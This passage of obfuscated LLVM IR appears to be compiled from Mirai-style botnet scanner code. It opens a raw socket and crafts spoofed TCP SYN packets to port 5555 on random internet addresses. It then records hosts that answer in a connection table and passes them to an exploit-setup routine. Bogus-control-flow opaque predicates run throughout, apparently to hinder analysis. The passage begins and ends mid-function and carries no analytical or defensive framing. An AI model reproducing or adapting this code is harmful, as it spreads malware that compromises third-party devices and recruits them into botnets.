  %88 = or i1 %86, %87
  br i1 %88, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %80
  %89 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %89, i32* @exploit_rsck, align 4
  %90 = icmp eq i32 %89, -1
  %91 = load i32, i32* @x.49
  %92 = load i32, i32* @y.50
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %90, label %99, label %116

; <label>:99:                                     ; preds = %originalBBpart24
  %100 = load i32, i32* @x.49
  %101 = load i32, i32* @y.50
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %99
  call void @exit(i32 0) #12
  %108 = load i32, i32* @x.49
  %109 = load i32, i32* @y.50
  %110 = sub i32 %108, 1
  %111 = mul i32 %108, %110
  %112 = urem i32 %111, 2
  %113 = icmp eq i32 %112, 0
  %114 = icmp slt i32 %109, 10
  %115 = or i1 %113, %114
  br i1 %115, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  unreachable

; <label>:116:                                    ; preds = %originalBBpart24
  %117 = load i32, i32* @exploit_rsck, align 4
  %118 = load i32, i32* @exploit_rsck, align 4
  %119 = call i32 (i32, i32, ...) @fcntl(i32 %118, i32 3, i32 0)
  %120 = or i32 2048, %119
  %121 = call i32 (i32, i32, ...) @fcntl(i32 %117, i32 4, i32 %120)
  store i32 1, i32* %1, align 4
  %122 = load i32, i32* @exploit_rsck, align 4
  %123 = bitcast i32* %1 to i8*
  %124 = call i32 @setsockopt(i32 %122, i32 0, i32 3, i8* %123, i32 4) #6
  %125 = icmp ne i32 %124, 0
  br i1 %125, label %126, label %145

; <label>:126:                                    ; preds = %116
  %127 = load i32, i32* @x.49
  %128 = load i32, i32* @y.50
  %129 = sub i32 %127, 1
  %130 = mul i32 %127, %129
  %131 = urem i32 %130, 2
  %132 = icmp eq i32 %131, 0
  %133 = icmp slt i32 %128, 10
  %134 = or i1 %132, %133
  br i1 %134, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %126
  %135 = load i32, i32* @exploit_rsck, align 4
  %136 = call i32 @close(i32 %135)
  call void @exit(i32 0) #12
  %137 = load i32, i32* @x.49
  %138 = load i32, i32* @y.50
  %139 = sub i32 %137, 1
  %140 = mul i32 %137, %139
  %141 = urem i32 %140, 2
  %142 = icmp eq i32 %141, 0
  %143 = icmp slt i32 %138, 10
  %144 = or i1 %142, %143
  br i1 %144, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  unreachable

; <label>:145:                                    ; preds = %116
  br label %146

; <label>:146:                                    ; preds = %150, %145
  %147 = call i32 @rand_next()
  %148 = and i32 %147, 65535
  %149 = trunc i32 %148 to i16
  store i16 %149, i16* %2, align 2
  br label %150

; <label>:150:                                    ; preds = %146
  %151 = load i16, i16* %2, align 2
  %152 = call zeroext i16 @ntohs(i16 zeroext %151) #9
  %153 = zext i16 %152 to i32
  %154 = icmp slt i32 %153, 1024
  br i1 %154, label %146, label %155

; <label>:155:                                    ; preds = %150
  %156 = load i32, i32* @x.49
  %157 = load i32, i32* @y.50
  %158 = sub i32 %156, 1
  %159 = mul i32 %156, %158
  %160 = urem i32 %159, 2
  %161 = icmp eq i32 %160, 0
  %162 = icmp slt i32 %157, 10
  %163 = or i1 %161, %162
  br i1 %163, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %155
  store %struct.iphdr* bitcast ([40 x i8]* @exploit_scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %3, align 8
  %164 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %165 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %164, i64 1
  %166 = bitcast %struct.iphdr* %165 to %struct.anon.0*
  store %struct.anon.0* %166, %struct.anon.0** %4, align 8
  %167 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %168 = bitcast %struct.iphdr* %167 to i8*
  %169 = load i8, i8* %168, align 4
  %170 = and i8 %169, -16
  %171 = or i8 %170, 5
  store i8 %171, i8* %168, align 4
  %172 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %173 = bitcast %struct.iphdr* %172 to i8*
  %174 = load i8, i8* %173, align 4
  %175 = and i8 %174, 15
  %176 = or i8 %175, 64
  store i8 %176, i8* %173, align 4
  %177 = call zeroext i16 @htons(i16 zeroext 40) #9
  %178 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %179 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %178, i32 0, i32 2
  store i16 %177, i16* %179, align 2
  %180 = call i32 @rand_next()
  %181 = trunc i32 %180 to i16
  %182 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %182, i32 0, i32 3
  store i16 %181, i16* %183, align 4
  %184 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %185 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %184, i32 0, i32 5
  store i8 64, i8* %185, align 4
  %186 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %187 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %186, i32 0, i32 6
  store i8 6, i8* %187, align 1
  %188 = call zeroext i16 @htons(i16 zeroext 5555) #9
  %189 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %190 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %189, i32 0, i32 1
  store i16 %188, i16* %190, align 2
  %191 = load i16, i16* %2, align 2
  %192 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %193 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %192, i32 0, i32 0
  store i16 %191, i16* %193, align 4
  %194 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %195 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %194, i32 0, i32 4
  %196 = load i16, i16* %195, align 4
  %197 = and i16 %196, -241
  %198 = or i16 %197, 80
  store i16 %198, i16* %195, align 4
  %199 = call i32 @rand_next()
  %200 = and i32 %199, 65535
  %201 = trunc i32 %200 to i16
  %202 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %203 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %202, i32 0, i32 5
  store i16 %201, i16* %203, align 2
  %204 = load %struct.anon.0*, %struct.anon.0** %4, align 8
  %205 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %204, i32 0, i32 4
  %206 = load i16, i16* %205, align 4
  %207 = and i16 %206, -513
  %208 = or i16 %207, 512
  store i16 %208, i16* %205, align 4
  %209 = load i32, i32* @x.49
  %210 = load i32, i32* @y.50
  %211 = sub i32 %209, 1
  %212 = mul i32 %209, %211
  %213 = urem i32 %212, 2
  %214 = icmp eq i32 %213, 0
  %215 = icmp slt i32 %210, 10
  %216 = or i1 %214, %215
  br i1 %216, label %originalBBpart279, label %originalBB14alteredBB

originalBBpart279:                                ; preds = %originalBB14
  br label %217

; <label>:217:                                    ; preds = %originalBBpart2261, %originalBBpart279
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %218 = load i32, i32* @exploit_fake_time, align 4
  %219 = load i32, i32* %10, align 4
  %220 = icmp ne i32 %218, %219
  br i1 %220, label %221, label %301

; <label>:221:                                    ; preds = %217
  %222 = load i32, i32* @exploit_fake_time, align 4
  store i32 %222, i32* %10, align 4
  store i32 0, i32* %1, align 4
  br label %223

; <label>:223:                                    ; preds = %297, %221
  %224 = load i32, i32* @x.49
  %225 = load i32, i32* @y.50
  %226 = sub i32 %224, 1
  %227 = mul i32 %224, %226
  %228 = urem i32 %227, 2
  %229 = icmp eq i32 %228, 0
  %230 = icmp slt i32 %225, 10
  %231 = or i1 %229, %230
  br i1 %231, label %originalBB81, label %originalBB81alteredBB

originalBB81:                                     ; preds = %originalBB81alteredBB, %223
  %232 = load i32, i32* %1, align 4
  %233 = icmp slt i32 %232, 160
  %234 = load i32, i32* @x.49
  %235 = load i32, i32* @y.50
  %236 = sub i32 %234, 1
  %237 = mul i32 %234, %236
  %238 = urem i32 %237, 2
  %239 = icmp eq i32 %238, 0
  %240 = icmp slt i32 %235, 10
  %241 = or i1 %239, %240
  br i1 %241, label %originalBBpart283, label %originalBB81alteredBB

originalBBpart283:                                ; preds = %originalBB81
  br i1 %233, label %242, label %300

; <label>:242:                                    ; preds = %originalBBpart283
  %243 = bitcast %struct.sockaddr_in* %14 to i8*
  call void @llvm.memset.p0i8.i64(i8* %243, i8 0, i64 16, i32 4, i1 false)
  store %struct.iphdr* bitcast ([40 x i8]* @exploit_scanner_rawpkt to %struct.iphdr*), %struct.iphdr** %15, align 8
  %244 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %245 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %244, i64 1
  %246 = bitcast %struct.iphdr* %245 to %struct.anon.0*
  store %struct.anon.0* %246, %struct.anon.0** %16, align 8
  %247 = call i32 @rand_next()
  %248 = trunc i32 %247 to i16
  %249 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %250 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %249, i32 0, i32 3
  store i16 %248, i16* %250, align 4
  %251 = load i32, i32* @LOCAL_ADDR, align 4
  %252 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %253 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %252, i32 0, i32 8
  store i32 %251, i32* %253, align 4
  %254 = call i32 @get_random_ip()
  %255 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %256 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %255, i32 0, i32 9
  store i32 %254, i32* %256, align 4
  %257 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %258 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %257, i32 0, i32 7
  store i16 0, i16* %258, align 2
  %259 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %260 = bitcast %struct.iphdr* %259 to i16*
  %261 = call zeroext i16 @checksum_generic(i16* %260, i32 20)
  %262 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %263 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %262, i32 0, i32 7
  store i16 %261, i16* %263, align 2
  %264 = call zeroext i16 @htons(i16 zeroext 5555) #9
  %265 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %266 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %265, i32 0, i32 1
  store i16 %264, i16* %266, align 2
  %267 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %268 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %267, i32 0, i32 9
  %269 = load i32, i32* %268, align 4
  %270 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %271 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %270, i32 0, i32 2
  store i32 %269, i32* %271, align 4
  %272 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %273 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %272, i32 0, i32 6
  store i16 0, i16* %273, align 4
  %274 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %275 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %276 = bitcast %struct.anon.0* %275 to i8*
  %277 = call zeroext i16 @htons(i16 zeroext 20) #9
  %278 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %274, i8* %276, i16 zeroext %277, i32 20)
  %279 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %280 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %279, i32 0, i32 6
  store i16 %278, i16* %280, align 4
  %281 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  store i16 2, i16* %281, align 4
  %282 = load %struct.iphdr*, %struct.iphdr** %15, align 8
  %283 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %282, i32 0, i32 9
  %284 = load i32, i32* %283, align 4
  %285 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  %286 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %285, i32 0, i32 0
  store i32 %284, i32* %286, align 4
  %287 = load %struct.anon.0*, %struct.anon.0** %16, align 8
  %288 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %287, i32 0, i32 1
  %289 = load i16, i16* %288, align 2
  %290 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %289, i16* %290, align 2
  %291 = load i32, i32* @exploit_rsck, align 4
  %292 = bitcast %union.__CONST_SOCKADDR_ARG* %17 to %struct.sockaddr**
  %293 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  store %struct.sockaddr* %293, %struct.sockaddr** %292, align 8
  %294 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %17, i32 0, i32 0
  %295 = load %struct.sockaddr*, %struct.sockaddr** %294, align 8
  %296 = call i64 @sendto(i32 %291, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @exploit_scanner_rawpkt, i32 0, i32 0), i64 40, i32 16384, %struct.sockaddr* %295, i32 16)
  br label %297

; <label>:297:                                    ; preds = %242
  %298 = load i32, i32* %1, align 4
  %299 = add nsw i32 %298, 1
  store i32 %299, i32* %1, align 4
  br label %223

; <label>:300:                                    ; preds = %originalBBpart283
  br label %301

; <label>:301:                                    ; preds = %300, %217
  store i32 0, i32* %9, align 4
  br label %302

; <label>:302:                                    ; preds = %531, %471, %459, %451, %443, %435, %427, %418, %originalBBpart299, %386, %originalBBpart291, %301
  %303 = load i32, i32* @x.49
  %304 = load i32, i32* @y.50
  %305 = sub i32 %303, 1
  %306 = mul i32 %303, %305
  %307 = urem i32 %306, 2
  %308 = icmp eq i32 %307, 0
  %309 = icmp slt i32 %304, 10
  %310 = or i1 %308, %309
  br i1 %310, label %originalBB85, label %originalBB85alteredBB

originalBB85:                                     ; preds = %originalBB85alteredBB, %302
  store i32 0, i32* %18, align 4
  %311 = getelementptr inbounds [1514 x i8], [1514 x i8]* %19, i32 0, i32 0
  %312 = bitcast i8* %311 to %struct.iphdr*
  store %struct.iphdr* %312, %struct.iphdr** %20, align 8
  %313 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %314 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %313, i64 1
  %315 = bitcast %struct.iphdr* %314 to %struct.anon.0*
  store %struct.anon.0* %315, %struct.anon.0** %21, align 8
  %316 = call i32* @__errno_location() #9
  store i32 0, i32* %316, align 4
  %317 = load i32, i32* @exploit_rsck, align 4
  %318 = getelementptr inbounds [1514 x i8], [1514 x i8]* %19, i32 0, i32 0
  %319 = bitcast %union.__CONST_SOCKADDR_ARG* %23 to %struct.sockaddr**
  store %struct.sockaddr* null, %struct.sockaddr** %319, align 8
  %320 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %23, i32 0, i32 0
  %321 = load %struct.sockaddr*, %struct.sockaddr** %320, align 8
  %322 = call i64 @recvfrom(i32 %317, i8* %318, i64 1514, i32 16384, %struct.sockaddr* %321, i32* null)
  %323 = trunc i64 %322 to i32
  store i32 %323, i32* %18, align 4
  %324 = load i32, i32* %18, align 4
  %325 = icmp sle i32 %324, 0
  %326 = load i32, i32* @x.49
  %327 = load i32, i32* @y.50
  %328 = sub i32 %326, 1
  %329 = mul i32 %326, %328
  %330 = urem i32 %329, 2
  %331 = icmp eq i32 %330, 0
  %332 = icmp slt i32 %327, 10
  %333 = or i1 %331, %332
  br i1 %333, label %originalBBpart287, label %originalBB85alteredBB

originalBBpart287:                                ; preds = %originalBB85
  br i1 %325, label %342, label %334

; <label>:334:                                    ; preds = %originalBBpart287
  %335 = call i32* @__errno_location() #9
  %336 = load i32, i32* %335, align 4
  %337 = icmp eq i32 %336, 11
  br i1 %337, label %342, label %338

; <label>:338:                                    ; preds = %334
  %339 = call i32* @__errno_location() #9
  %340 = load i32, i32* %339, align 4
  %341 = icmp eq i32 %340, 11
  br i1 %341, label %342, label %343

; <label>:342:                                    ; preds = %338, %334, %originalBBpart287
  br label %543

; <label>:343:                                    ; preds = %338
  %344 = load i32, i32* %18, align 4
  %345 = sext i32 %344 to i64
  %346 = icmp ult i64 %345, 40
  br i1 %346, label %347, label %364

; <label>:347:                                    ; preds = %343
  %348 = load i32, i32* @x.49
  %349 = load i32, i32* @y.50
  %350 = sub i32 %348, 1
  %351 = mul i32 %348, %350
  %352 = urem i32 %351, 2
  %353 = icmp eq i32 %352, 0
  %354 = icmp slt i32 %349, 10
  %355 = or i1 %353, %354
  br i1 %355, label %originalBB89, label %originalBB89alteredBB

originalBB89:                                     ; preds = %originalBB89alteredBB, %347
  %356 = load i32, i32* @x.49
  %357 = load i32, i32* @y.50
  %358 = sub i32 %356, 1
  %359 = mul i32 %356, %358
  %360 = urem i32 %359, 2
  %361 = icmp eq i32 %360, 0
  %362 = icmp slt i32 %357, 10
  %363 = or i1 %361, %362
  br i1 %363, label %originalBBpart291, label %originalBB89alteredBB

originalBBpart291:                                ; preds = %originalBB89
  br label %302

; <label>:364:                                    ; preds = %343
  %365 = load i32, i32* @x.49
  %366 = load i32, i32* @y.50
  %367 = sub i32 %365, 1
  %368 = mul i32 %365, %367
  %369 = urem i32 %368, 2
  %370 = icmp eq i32 %369, 0
  %371 = icmp slt i32 %366, 10
  %372 = or i1 %370, %371
  br i1 %372, label %originalBB93, label %originalBB93alteredBB

originalBB93:                                     ; preds = %originalBB93alteredBB, %364
  %373 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %374 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %373, i32 0, i32 9
  %375 = load i32, i32* %374, align 4
  %376 = load i32, i32* @LOCAL_ADDR, align 4
  %377 = icmp ne i32 %375, %376
  %378 = load i32, i32* @x.49
  %379 = load i32, i32* @y.50
  %380 = sub i32 %378, 1
  %381 = mul i32 %378, %380
  %382 = urem i32 %381, 2
  %383 = icmp eq i32 %382, 0
  %384 = icmp slt i32 %379, 10
  %385 = or i1 %383, %384
  br i1 %385, label %originalBBpart295, label %originalBB93alteredBB

originalBBpart295:                                ; preds = %originalBB93
  br i1 %377, label %386, label %387

; <label>:386:                                    ; preds = %originalBBpart295
  br label %302

; <label>:387:                                    ; preds = %originalBBpart295
  %388 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %389 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %388, i32 0, i32 6
  %390 = load i8, i8* %389, align 1
  %391 = zext i8 %390 to i32
  %392 = icmp ne i32 %391, 6
  br i1 %392, label %393, label %410

; <label>:393:                                    ; preds = %387
  %394 = load i32, i32* @x.49
  %395 = load i32, i32* @y.50
  %396 = sub i32 %394, 1
  %397 = mul i32 %394, %396
  %398 = urem i32 %397, 2
  %399 = icmp eq i32 %398, 0
  %400 = icmp slt i32 %395, 10
  %401 = or i1 %399, %400
  br i1 %401, label %originalBB97, label %originalBB97alteredBB

originalBB97:                                     ; preds = %originalBB97alteredBB, %393
  %402 = load i32, i32* @x.49
  %403 = load i32, i32* @y.50
  %404 = sub i32 %402, 1
  %405 = mul i32 %402, %404
  %406 = urem i32 %405, 2
  %407 = icmp eq i32 %406, 0
  %408 = icmp slt i32 %403, 10
  %409 = or i1 %407, %408
  br i1 %409, label %originalBBpart299, label %originalBB97alteredBB

originalBBpart299:                                ; preds = %originalBB97
  br label %302

; <label>:410:                                    ; preds = %387
  %411 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %412 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %411, i32 0, i32 0
  %413 = load i16, i16* %412, align 4
  %414 = zext i16 %413 to i32
  %415 = call zeroext i16 @htons(i16 zeroext 5555) #9
  %416 = zext i16 %415 to i32
  %417 = icmp ne i32 %414, %416
  br i1 %417, label %418, label %419

; <label>:418:                                    ; preds = %410
  br label %302

; <label>:419:                                    ; preds = %410
  %420 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %421 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %420, i32 0, i32 1
  %422 = load i16, i16* %421, align 2
  %423 = zext i16 %422 to i32
  %424 = load i16, i16* %2, align 2
  %425 = zext i16 %424 to i32
  %426 = icmp ne i32 %423, %425
  br i1 %426, label %427, label %428

; <label>:427:                                    ; preds = %419
  br label %302

; <label>:428:                                    ; preds = %419
  %429 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %430 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %429, i32 0, i32 4
  %431 = load i16, i16* %430, align 4
  %432 = lshr i16 %431, 9
  %433 = and i16 %432, 1
  %434 = icmp ne i16 %433, 0
  br i1 %434, label %436, label %435

; <label>:435:                                    ; preds = %428
  br label %302

; <label>:436:                                    ; preds = %428
  %437 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %438 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %437, i32 0, i32 4
  %439 = load i16, i16* %438, align 4
  %440 = lshr i16 %439, 12
  %441 = and i16 %440, 1
  %442 = icmp ne i16 %441, 0
  br i1 %442, label %444, label %443

; <label>:443:                                    ; preds = %436
  br label %302

; <label>:444:                                    ; preds = %436
  %445 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %446 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %445, i32 0, i32 4
  %447 = load i16, i16* %446, align 4
  %448 = lshr i16 %447, 10
  %449 = and i16 %448, 1
  %450 = icmp ne i16 %449, 0
  br i1 %450, label %451, label %452

; <label>:451:                                    ; preds = %444
  br label %302

; <label>:452:                                    ; preds = %444
  %453 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %454 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %453, i32 0, i32 4
  %455 = load i16, i16* %454, align 4
  %456 = lshr i16 %455, 8
  %457 = and i16 %456, 1
  %458 = icmp ne i16 %457, 0
  br i1 %458, label %459, label %460

; <label>:459:                                    ; preds = %452
  br label %302

; <label>:460:                                    ; preds = %452
  %461 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %462 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %461, i32 0, i32 3
  %463 = load i32, i32* %462, align 4
  %464 = call i32 @ntohl(i32 %463) #9
  %465 = sub i32 %464, 1
  %466 = call i32 @htonl(i32 %465) #9
  %467 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %468 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %467, i32 0, i32 8
  %469 = load i32, i32* %468, align 4
  %470 = icmp ne i32 %466, %469
  br i1 %470, label %471, label %472

; <label>:471:                                    ; preds = %460
  br label %302

; <label>:472:                                    ; preds = %460
  store %struct.exploit_scanner_connection* null, %struct.exploit_scanner_connection** %22, align 8
  %473 = load i32, i32* %9, align 4
  store i32 %473, i32* %18, align 4
  br label %474

; <label>:474:                                    ; preds = %originalBBpart2115, %472
  %475 = load i32, i32* %18, align 4
  %476 = icmp slt i32 %475, 128
  br i1 %476, label %477, label %527

; <label>:477:                                    ; preds = %474
  %478 = load i32, i32* @x.49
  %479 = load i32, i32* @y.50
  %480 = sub i32 %478, 1
  %481 = mul i32 %478, %480
  %482 = urem i32 %481, 2
  %483 = icmp eq i32 %482, 0
  %484 = icmp slt i32 %479, 10
  %485 = or i1 %483, %484
  br i1 %485, label %originalBB101, label %originalBB101alteredBB

originalBB101:                                    ; preds = %originalBB101alteredBB, %477
  %486 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %487 = load i32, i32* %18, align 4
  %488 = sext i32 %487 to i64
  %489 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %486, i64 %488
  %490 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %489, i32 0, i32 2
  %491 = load i32, i32* %490, align 8
  %492 = icmp eq i32 %491, 0
  %493 = load i32, i32* @x.49
  %494 = load i32, i32* @y.50
  %495 = sub i32 %493, 1
  %496 = mul i32 %493, %495
  %497 = urem i32 %496, 2
  %498 = icmp eq i32 %497, 0
  %499 = icmp slt i32 %494, 10
  %500 = or i1 %498, %499
  br i1 %500, label %originalBBpart2103, label %originalBB101alteredBB

originalBBpart2103:                               ; preds = %originalBB101
  br i1 %492, label %501, label %507

; <label>:501:                                    ; preds = %originalBBpart2103
  %502 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %503 = load i32, i32* %18, align 4
  %504 = sext i32 %503 to i64
  %505 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %502, i64 %504
  store %struct.exploit_scanner_connection* %505, %struct.exploit_scanner_connection** %22, align 8
  %506 = load i32, i32* %18, align 4
  store i32 %506, i32* %9, align 4
  br label %527

; <label>:507:                                    ; preds = %originalBBpart2103
  br label %508

; <label>:508:                                    ; preds = %507
  %509 = load i32, i32* @x.49
  %510 = load i32, i32* @y.50
  %511 = sub i32 %509, 1
  %512 = mul i32 %509, %511
  %513 = urem i32 %512, 2
  %514 = icmp eq i32 %513, 0
  %515 = icmp slt i32 %510, 10
  %516 = or i1 %514, %515
  br i1 %516, label %originalBB105, label %originalBB105alteredBB

originalBB105:                                    ; preds = %originalBB105alteredBB, %508
  %517 = load i32, i32* %18, align 4
  %518 = add nsw i32 %517, 1
  store i32 %518, i32* %18, align 4
  %519 = load i32, i32* @x.49
  %520 = load i32, i32* @y.50
  %521 = sub i32 %519, 1
  %522 = mul i32 %519, %521
  %523 = urem i32 %522, 2
  %524 = icmp eq i32 %523, 0
  %525 = icmp slt i32 %520, 10
  %526 = or i1 %524, %525
  br i1 %526, label %originalBBpart2115, label %originalBB105alteredBB

originalBBpart2115:                               ; preds = %originalBB105
  br label %474

; <label>:527:                                    ; preds = %501, %474
  %528 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %22, align 8
  %529 = icmp eq %struct.exploit_scanner_connection* %528, null
  br i1 %529, label %530, label %531

; <label>:530:                                    ; preds = %527
  br label %543

; <label>:531:                                    ; preds = %527
  %532 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %533 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %532, i32 0, i32 8
  %534 = load i32, i32* %533, align 4
  %535 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %22, align 8
  %536 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %535, i32 0, i32 3
  store i32 %534, i32* %536, align 4
  %537 = load %struct.anon.0*, %struct.anon.0** %21, align 8
  %538 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %537, i32 0, i32 0
  %539 = load i16, i16* %538, align 4
  %540 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %22, align 8
  %541 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %540, i32 0, i32 4
  store i16 %539, i16* %541, align 8
  %542 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** %22, align 8
  call void @exploit_setup_connection(%struct.exploit_scanner_connection* %542)
  br label %302

; <label>:543:                                    ; preds = %530, %342
  %544 = load i32, i32* @x.49
  %545 = load i32, i32* @y.50
  %546 = sub i32 %544, 1
  %547 = mul i32 %544, %546
  %548 = urem i32 %547, 2
  %549 = icmp eq i32 %548, 0
  %550 = icmp slt i32 %545, 10
  %551 = or i1 %549, %550
  br i1 %551, label %originalBB117, label %originalBB117alteredBB

originalBB117:                                    ; preds = %originalBB117alteredBB, %543
  %552 = load i32, i32* @x.49
  %553 = load i32, i32* @y.50
  %554 = sub i32 %552, 1
  %555 = mul i32 %552, %554
  %556 = urem i32 %555, 2
  %557 = icmp eq i32 %556, 0
  %558 = icmp slt i32 %553, 10
  %559 = or i1 %557, %558
  br i1 %559, label %originalBBpart2119, label %originalBB117alteredBB

originalBBpart2119:                               ; preds = %originalBB117
  br label %560

; <label>:560:                                    ; preds = %originalBBpart2119
  %561 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %5, i32 0, i32 0
  %562 = getelementptr inbounds [16 x i64], [16 x i64]* %561, i64 0, i64 0
  %563 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %562) #6, !srcloc !1
  %564 = extractvalue { i64, i64* } %563, 0
  %565 = extractvalue { i64, i64* } %563, 1
  %566 = trunc i64 %564 to i32
  store i32 %566, i32* %24, align 4
  %567 = ptrtoint i64* %565 to i64
  %568 = trunc i64 %567 to i32
  store i32 %568, i32* %25, align 4
  br label %569

; <label>:569:                                    ; preds = %560
  br label %570

; <label>:570:                                    ; preds = %569
  %571 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %6, i32 0, i32 0
  %572 = getelementptr inbounds [16 x i64], [16 x i64]* %571, i64 0, i64 0
  %573 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %572) #6, !srcloc !2
  %574 = extractvalue { i64, i64* } %573, 0
  %575 = extractvalue { i64, i64* } %573, 1
  %576 = trunc i64 %574 to i32
  store i32 %576, i32* %26, align 4
  %577 = ptrtoint i64* %575 to i64
